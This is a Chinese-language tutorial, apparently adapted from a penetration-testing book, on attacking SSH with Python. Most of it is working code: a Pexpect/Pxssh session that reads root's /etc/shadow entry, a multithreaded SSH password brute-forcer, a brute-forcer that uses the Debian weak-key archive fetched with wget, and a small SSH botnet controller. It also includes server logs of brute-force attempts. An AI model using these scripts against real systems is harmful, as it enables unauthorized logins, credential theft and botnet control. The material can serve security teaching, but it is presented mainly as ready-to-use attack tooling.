Morris蠕虫有三种攻击方式，其中之一就是用常见的用户名和密码尝试登录RSH(remote shell)服务。
    RSH是1998年问世的，它为系统管理员提供了一种很棒(尽管不安全)远程连接一台机器，并能在主机上运行一系列终端命令对它进行管理的方法。
    
后来人们在RSH中增加了一个密钥加密算法，以保护其经过网络传递的数据，这就是SSH(secure shell)协议，最终SSH取代了RSH。

不过，对于防范用常见用户名和密码尝试暴力登录的攻击方式，这并不能起多大的作用。SSH蠕虫已经被证明是非常成功和常见的攻击SSH攻击方式。

```
Tue Jul 18 13:49:00 2017 [pid 12371] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:02 2017 [pid 12370] [user] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:03 2017 [pid 12373] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:05 2017 [pid 12372] [user] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:06 2017 [pid 12375] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:08 2017 [pid 12374] [user] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:11 2017 [pid 12374] [user] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:12 2017 [pid 12377] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:14 2017 [pid 12376] [user] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:17 2017 [pid 12376] [user] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:18 2017 [pid 12379] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:20 2017 [pid 12378] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:23 2017 [pid 12378] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:24 2017 [pid 12381] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:27 2017 [pid 12380] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:27 2017 [pid 12383] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:29 2017 [pid 12382] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:30 2017 [pid 12385] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:32 2017 [pid 12384] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:36 2017 [pid 12384] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:36 2017 [pid 12389] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:39 2017 [pid 12388] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:39 2017 [pid 12391] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:42 2017 [pid 12390] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:43 2017 [pid 12393] CONNECT: Client "140.205.225.191"
Tue Jul 18 13:49:45 2017 [pid 12392] [root] FAIL LOGIN: Client "140.205.225.191"
Tue Jul 18 13:49:46 2017 [pid 12395] CONNECT: Client "140.205.225.191"
Tue Jul 18 14:03:05 2017 [pid 12567] CONNECT: Client "39.43.64.192"
Tue Jul 18 14:03:09 2017 [pid 12566] [Admin] FAIL LOGIN: Client "39.43.64.192"
```

这是我阿里云服务器上ftp的日志记录。服务器每天都会受到大量的扫描攻击。

### 用Pexpect与SSH交互

现在，让我们来实现自己的暴力破解特定目标用户名/密码的SSH蠕虫。
    因为SSH客户端需要用户与之进行交互，我们脚本俄必须在发送进一步的输入命令之前等待并"理解屏幕输出的意义。

考虑一下情形：要连接我们架在IP地址127.0.0.1上SSH的机器，应用程序首先会要求我们确认RSA密钥指纹。

这时我们必须回答“是”，然后才能继续。接下来，在给我们一个命令提示符之前，应用程序要求我们输入密码。
    最后，我们还要执行uname -v命令来确定目标机器上系统内核的版本。
    
```
➜  ~ ssh root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:yFjJtQviMKIarBcVssu8hwxyzoOgg5jrOICm8Eu1t8E.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
root@localhost's password:
linuxbox# uname -v
#63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017
```

为了能自动完成上述控制台交互过程，我们需要使用一个第三方Python模块 —— Pexpect.

Pexpect能够实现与程序交互、等待预期的屏幕输出，并据此做出不同的响应。这使得它称为自己暴力破解SSH用户口令程序的首选工具。


检测connect()函数。该函数接受参数包括一个用户名、主机和密码，返回的是以此进行的SSH连接的结果。
    然后利用Pexpect库，我们的程序等待一个"可以预计到的"输出，可能会出现三种情况：超时、表示主机已使用一个新的公钥消息和要求是如密码的提示。


如果出现超时，那么session.expect()返回0，用下面的if语句会是别出这一情况，打印一个错误消息返回。
    如果child.expect()方法捕获了ssh_newkey消息，它会返回1，这会使函数发送一个"yes"消息，以接受新的密钥。
    之后，函数等待密码提示，然后发送SSH密码。
    

```python
import pexpect

PROMPT = ['# ', '>>> ', '> ', "\$ "]


def sen_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_newkey = 'are you sure you want to continue connecting'
    conn_str = 'ssh ' + user + '@' + host
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
    if ret == 0:
        print('[-] error connecting')
        return

    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])

        if ret == 0:
            print('[-] error connecting')
            return

        child.sendline(password)
        child.expect(PROMPT)
        return child
```


一旦通过验证，我们就可以使用一个单独的command()函数在SSH会话中发送命令。
    command()函数需要接收的参数是一个SSH会话的命令字符串。
    然后，它向会话发送命令字符串，并等待命令提示符再次出现。
    在获得命令提示符后，该函数把从SSH会话那里得到的结果打印出来。

```python
import pexpect

PROMPT = ['# ', '>>> ', '> ', "\$ "]


def sen_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)
```

把所有的这些打包在一起，我们就有了一个可以模拟人的交互行为的连接和控制SSH会话的脚本.

```python
import pexpect

PROMPT = ['# ', '>>> ', '> ', "\$ "]


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_newkey = 'are you sure you want to continue connecting'
    conn_info = 'ssh ' + user + '@' + host
    child = pexpect.spawn(conn_info)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
    if ret == 0:
        print('[-] error connecting')
        return

    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])

        if ret == 0:
            print('[-] error connecting')
            return

        child.sendline(password)
        child.expect(PROMPT)
        return child


def main():
    host = 'localhost'
    user = 'root'
    password = 'toor'

    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')


if __name__ == '__main__':
    main()
```

### 用Pxssh暴力破解SSH密码

尽管上面这个脚本让我们对pexpect有了了解，但是还可以用Pxssh进一步简化它。
    Pxssh是一个包含了pexpect库的专用脚本，它能用预先写好的login()、logout()和prompt()函数等直接与SSH进行交互。

```python
from pexpect import pxssh


def send_command(s, cmd):
    s.sendline(cmd)
    s.prompt()
    print(s.before)


def connect(host, user, password):
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        return s
    except:
        print('[-] error connecting')
        exit(0)


s = connect('127.0.0.1', 'root', 'toor')
send_command(s, 'cat /etc/shadow | grep root')
```


脚本只要再做些小的修改就能是脚本自动执行暴力破解SSH口令的任务。

除了加一些参数解析代码来读取主机名、用户名和存有待尝试的密码的文件外，我们只需要对connect()函数稍作修改。
    如果login()函数执行成功，并且没有抛出异常，我们将打印一个消息，表明密码已被找到，并把表示密码一杯找到的全局布尔值设为True。
    否则，我们将不过该异常，如果异常显示密码被拒绝，我们知道这个密码不对，让函数返回即可。
    但是，如果异常显示socket为"read_nonblocking"，可能是SSH服务器被大量的连接刷爆了，可以稍等一会用相同的密码再试一次。
    此外，如果该异常显示pxssh命令提示符提取困难，也应该等一会，然后再让它试一次。

在connect()函数的参数里有一个布尔量release。
    由于connect()可以递归的调用，我们必须让只有不是有connect()递归调用的connect()函数才能够释放connect_lock信号。

```python
from pexpect import pxssh
import optparse
import time
from threading import *

maxconnections = 5
connectionlock = BoundedSemaphore(value=maxconnections)

isfound = False
fails = 0


def connect(host, user, password, release):
    global isfound
    global fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)

    finally:
        if release: connectionlock.release()


def main():
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host == None or passwdFile == None or user == None:
        print(parser.usage)
        exit(0)

    fn = open(passwdFile, 'r')
    for line in fn.readlines():

        if isfound:
            print("[*] Exiting: Password Found")

            exit(0)
        if fails > 5:
            print("[!] Exiting: Too Many Socket Timeouts")
            exit(0)

        connectionlock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == '__main__':
    main()
```

### 利用SSH中的弱私钥

对于SSH服务器，密码验证并不是唯一的手段。除此之外，SSH还能使用公钥加密的方式进行验证。
使用这一验证方式时，服务器和用户分别掌握公钥和私钥。使用RSA或是DSA算法，服务器能生成于SSH登录的密钥。
一般而言，这是一种非常好的验证方式。由于能够生成1024位、2048位，甚至是4096位的密钥，
这个认证过程就很难像刚才我们利用弱口令进行暴力破解那样破解掉。

不过，2006年Debian Linux发行版中发生了一件有意思的事情。软件自动分析工具发现了一行已被开发人员注释掉的代码。
这行代码用来确保创建SSH密钥的信息足够大。被注释掉之后，密钥的空间的大小的熵值降低到只有15位大小。
仅仅15位的熵意味着不论哪种算法和密钥长度，可能的密钥只有32767个。

Rapid7的CSO和首席架构师HD Moore在两小时内生成了所有的1024位和2048位算法的可能的密钥。
    而且，他把结果放到 http://digitaloffense.net/tools/debianopenssl/ 中，使大家都可以下载利用。

```
wget http://digitaloffense.net/tools/debian-openssl/debian_ssh_dsa_1024_x86.tar.bz2
```

这个错误在两天之后才被一个安全研究员发现。结果，可以肯定相当多的服务器上都有这个有漏洞的SSH服务。
如果我们能创建一个利用此漏洞的工具就太棒了。
通过访问密钥空间，可以写一个简短的Python脚本逐一暴力尝试32767个可能的密钥，
以此来登录一个不用密码，而是使用公钥加密算法旧进行认证的SSH服务器。
在使用密钥登录SSH时，我们需要键入 ssh user@host -i keyfile -o PasswordAuthenication=no 格式的一条命令。


```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pexpect
import optparse
import os
from threading import *

maxconnections = 5
connectionlock = BoundedSemaphore(value=maxconnections)
stop = False
fails = 0


def connect(user, host, keyfile, release):
    global stop
    global fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print('[-] Adding Host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection Closed By Remote Host')
            fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            stop = True
    finally:
        if release:
            connectionlock.release()


def main():
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-d', dest='passDir', type='string', help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user

    if host == None or passDir == None or user == None:
        print(parser.usage)
        exit(0)

    for filename in os.listdir(passDir):
        if stop:
            print('[*] Exiting: Key Found.')
            exit(0)
        if fails > 5:
            print('[!] Exiting: Too Many Connections Closed By Remote Host.')
            print('[!] Adjust number of simultaneous threads.')
            exit(0)
        connectionlock.acquire()
        fullpath = os.path.join(passDir, filename)
        print('[-] Testing keyfile ' + str(fullpath))
        t = Thread(target=connect, args=(user, host, fullpath, True))
        child = t.start()


if __name__ == '__main__':
    main()
```

### 构建SSH僵尸网络

我们已经能通过SSH控制主机，接下来让我们继续同时控制多台主机。
攻击者在达成恶意目的时，通常会使用被黑掉的计算机群。
我们称之为僵尸网络，因为被黑掉的电脑会像僵尸一样执行指令。

在僵尸网络中，每个单独的僵尸或client都需要有能连上某台肉机，并发命令发送给肉机的能力。

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pexpect import pxssh


class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] error connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print('[*] Output from ' + client.host)
        print('[+] ' + output)


def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)


botNet = []
addClient('127.0.0.1', 'root', 'toor')
addClient('127.0.0.1', 'root', 'toor')
addClient('127.0.0.1', 'root', 'toor')

botnetCommand('uname -v')
botnetCommand('cat /etc/issue')
```